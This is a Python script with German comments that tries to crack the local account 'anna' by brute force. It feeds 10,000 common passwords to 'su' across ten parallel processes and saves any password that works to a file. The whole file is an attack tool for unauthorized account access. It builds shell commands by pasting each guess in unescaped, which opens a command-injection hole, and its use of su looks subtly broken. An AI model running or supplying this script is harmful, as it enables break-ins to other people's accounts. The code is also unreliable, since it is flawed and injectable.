import os
import subprocess
import multiprocessing

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path = "./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username = "anna"

# Anzahl der Prozesse, die gleichzeitig gestartet werden sollen
num_processes = 10

# Ziel-Datei für das gefundene Passwort
output_file = "password.txt"

# Funktion zum Überprüfen eines Passworts
def check_password(password):
    command = f"echo '{password}' | su {username} 2>&1"
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode == 0:
        with open(output_file, "w") as f:
            f.write(password)
        return True
    else:
        return False

# Funktion für einen Prozess
def process_passwords(passwords):
    for password in passwords:
        if check_password(password):
            break

# Teile die Passwortliste in Unterlisten für jeden Prozess auf
with open(password_list_path, "r") as f:
    passwords = f.readlines()

chunk_size = len(passwords) // num_processes
password_chunks = [passwords[i:i+chunk_size] for i in range(0, len(passwords), chunk_size)]

# Starte die Prozesse parallel
processes = []
for chunk in password_chunks:
    p = multiprocessing.Process(target=process_passwords, args=(chunk,))
    processes.append(p)
    p.start()

# Warte auf die Beendigung aller Prozesse
for p in processes:
    p.join()

print("Passwort-Überprüfung abgeschlossen.")
